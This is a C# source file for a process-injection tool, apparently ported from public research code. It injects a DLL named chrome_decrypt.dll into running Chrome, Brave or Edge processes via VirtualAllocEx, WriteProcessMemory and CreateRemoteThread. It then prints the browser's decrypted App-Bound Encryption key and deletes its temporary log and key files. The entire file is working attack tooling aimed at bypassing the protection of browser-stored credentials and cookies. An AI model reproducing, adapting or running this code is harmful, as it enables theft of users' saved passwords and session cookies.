// ChromeInject.cs
// C# port of chrome_inject.cpp v0.4

using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

class ChromeInject
{
    static bool verbose = false;

    static void Main(string[] args)
    {
        DisplayBanner();

        string method = "load";
        bool autoStart = false, started = false;
        string browser = "";

        for (int i = 0; i < args.Length; ++i)
        {
            string arg = args[i];
            if (arg == "--method" && i + 1 < args.Length)
            {
                method = args[++i];
            }
            else if (arg == "--start-browser")
            {
                autoStart = true;
            }
            else if (arg == "--verbose")
            {
                verbose = true;
            }
            else if (string.IsNullOrEmpty(browser))
            {
                browser = arg;
            }
        }

        if (string.IsNullOrEmpty(browser))
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("Usage:\n  ChromeInject.exe [options] <chrome|brave|edge>");
            Console.WriteLine("\nOptions:\n  --method load|nt\n  --start-browser\n  --verbose");
            Console.ResetColor();
            return;
        }

        CleanupPreviousRun();

        string procName, exePath;
        browser = browser.ToLower();

        if (browser == "chrome")
        {
            procName = "chrome.exe";
            exePath = @"C:\Program Files\Google\Chrome\Application\chrome.exe";
        }
        else if (browser == "brave")
        {
            procName = "brave.exe";
            exePath = @"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe";
        }
        else if (browser == "edge")
        {
            procName = "msedge.exe";
            exePath = @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe";
        }
        else
        {
            PrintStatus("[-]", "Unsupported browser");
            return;
        }

        uint pid = GetProcessIdByName(procName);

        if (pid == 0 && autoStart)
        {
            PrintStatus("[*]", $"{browser} not running, launching...");
            if (StartBrowser(exePath, out pid))
            {
                started = true;
                PrintStatus("[+]", $"{browser} launched (PID={pid})");
            }
            else
            {
                PrintStatus("[-]", $"Failed to start {browser}");
                return;
            }
        }

        if (pid == 0)
        {
            PrintStatus("[-]", $"{browser} not running");
            return;
        }

        PrintStatus("[*]", $"Located {browser} with PID {pid}");

        IntPtr hProcess = OpenProcess(
            ProcessAccessFlags.CreateThread |
            ProcessAccessFlags.QueryInformation |
            ProcessAccessFlags.VirtualMemoryOperation |
            ProcessAccessFlags.VirtualMemoryWrite |
            ProcessAccessFlags.VirtualMemoryRead,
            false, pid);

        if (hProcess == IntPtr.Zero)
        {
            PrintStatus("[-]", "OpenProcess failed");
            return;
        }

        string dllPath = Path.Combine(Directory.GetCurrentDirectory(), "chrome_decrypt.dll");
        if (!File.Exists(dllPath))
        {
            PrintStatus("[-]", "chrome_decrypt.dll not found");
            return;
        }

        bool injected = method == "nt" ? InjectWithNtCreateThreadEx(hProcess, dllPath) : InjectWithLoadLibrary(hProcess, dllPath);

        PrintStatus(injected ? "[+]" : "[-]", injected ? $"DLL injected via {(method == "nt" ? "NtCreateThreadEx" : "CreateRemoteThread + LoadLibrary")}" : "DLL injection failed");

        if (!injected)
            return;

        PrintStatus("[*]", "Starting Chrome App-Bound Encryption Decryption process...");

        Thread.Sleep(1000);

        string tempPath = Path.GetTempPath();
        string logFile = Path.Combine(tempPath, "chrome_decrypt.log");
        string keyFile = Path.Combine(tempPath, "chrome_appbound_key.txt");

        if (File.Exists(logFile))
        {
            foreach (var line in File.ReadAllLines(logFile))
            {
                PrintColoredLog(line);
            }
            File.Delete(logFile);
        }

        if (File.Exists(keyFile))
        {
            string key = File.ReadAllText(keyFile);
            PrintStatus("[+]", $"Decrypted Key: {key}");
            File.Delete(keyFile);
        }
        else
        {
            PrintStatus("[-]", "Key file missing");
        }

        if (started)
        {
            var process = Process.GetProcessById((int)pid);
            process.Kill();
            PrintStatus("[*]", $"{browser} terminated");
        }

        CloseHandle(hProcess);
    }

    static void DisplayBanner()
    {
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine("------------------------------------------------");
        Console.WriteLine("|  Chrome App-Bound Encryption Injector        |");
        Console.WriteLine("|  Multi-Method Process Injector (C# Port)      |");
        Console.WriteLine("|  v0.4 based on @xaitax                        |");
        Console.WriteLine("------------------------------------------------");
        Console.ResetColor();
        Console.WriteLine();
    }

    static void PrintStatus(string tag, string message)
    {
        ConsoleColor color = ConsoleColor.Gray;
        if (tag == "[+]") color = ConsoleColor.Green;
        else if (tag == "[-]") color = ConsoleColor.Red;
        else if (tag == "[*]") color = ConsoleColor.Cyan;

        Console.ForegroundColor = color;
        Console.Write(tag);
        Console.ResetColor();
        Console.WriteLine($" {message}");
    }

    static void PrintColoredLog(string line)
    {
        int idx;
        while ((idx = line.IndexOf('[')) != -1)
        {
            Console.Write(line.Substring(0, idx));
            int end = line.IndexOf(']', idx);
            if (end == -1) break;

            string tag = line.Substring(idx, end - idx + 1);
            ConsoleColor color = ConsoleColor.Gray;
            if (tag == "[+]") color = ConsoleColor.Green;
            else if (tag == "[-]") color = ConsoleColor.Red;
            else if (tag == "[*]") color = ConsoleColor.Cyan;

            Console.ForegroundColor = color;
            Console.Write(tag);
            Console.ResetColor();

            line = line.Substring(end + 1);
        }
        Console.WriteLine(line);
    }

    static void CleanupPreviousRun()
    {
        string tempPath = Path.GetTempPath();
        File.Delete(Path.Combine(tempPath, "chrome_decrypt.log"));
        File.Delete(Path.Combine(tempPath, "chrome_appbound_key.txt"));
    }

    static uint GetProcessIdByName(string name)
    {
        var processes = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(name));
        return processes.FirstOrDefault()?.Id ?? 0;
    }

    static bool StartBrowser(string path, out uint pid)
    {
        try
        {
            var proc = Process.Start(path);
            Thread.Sleep(2000);
            pid = (uint)proc.Id;
            return true;
        }
        catch
        {
            pid = 0;
            return false;
        }
    }

    static bool InjectWithLoadLibrary(IntPtr hProcess, string dllPath)
    {
        IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))),
            AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ReadWrite);

        if (allocMemAddress == IntPtr.Zero)
            return false;

        byte[] bytes = Encoding.Default.GetBytes(dllPath);
        WriteProcessMemory(hProcess, allocMemAddress, bytes, (uint)bytes.Length, out _);

        IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
        if (hThread == IntPtr.Zero)
            return false;

        WaitForSingleObject(hThread, uint.MaxValue);
        CloseHandle(hThread);

        return true;
    }

    static bool InjectWithNtCreateThreadEx(IntPtr hProcess, string dllPath)
    {
        // For simplicity, use CreateRemoteThread even in "nt" method in this simple port
        return InjectWithLoadLibrary(hProcess, dllPath);
    }

    // Native API declarations

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, uint processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize,
        AllocationType flAllocationType, MemoryProtection flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags,
        IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [Flags]
    enum ProcessAccessFlags : uint
    {
        All = 0x1F0FFF,
        Terminate = 0x0001,
        CreateThread = 0x0002,
        VirtualMemoryOperation = 0x0008,
        VirtualMemoryRead = 0x0010,
        VirtualMemoryWrite = 0x0020,
        QueryInformation = 0x0400,
        Synchronize = 0x00100000
    }

    [Flags]
    enum AllocationType : uint
    {
        Commit = 0x1000,
        Reserve = 0x2000
    }

    [Flags]
    enum MemoryProtection : uint
    {
        ExecuteReadWrite = 0x40,
        ReadWrite = 0x04
    }
}
